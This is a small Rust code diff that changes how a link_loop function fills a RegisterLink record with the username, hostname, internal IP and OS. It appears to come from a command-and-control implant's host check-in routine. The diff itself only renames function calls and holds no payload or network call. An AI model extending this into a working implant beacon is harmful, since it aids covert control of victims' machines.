@@ -44,8 +44,8 @@ pub fn link_loop() {
         }
     }
     let register_link = RegisterLink {
-            link_username: username(),
-            link_hostname: hostname(),
+            link_username: whoami::username(),
+            link_hostname: whoami::hostname(),
             internal_ip: internal_ip(),
             external_ip: String::new(),
             platform: std::env::consts::OS.to_string(),
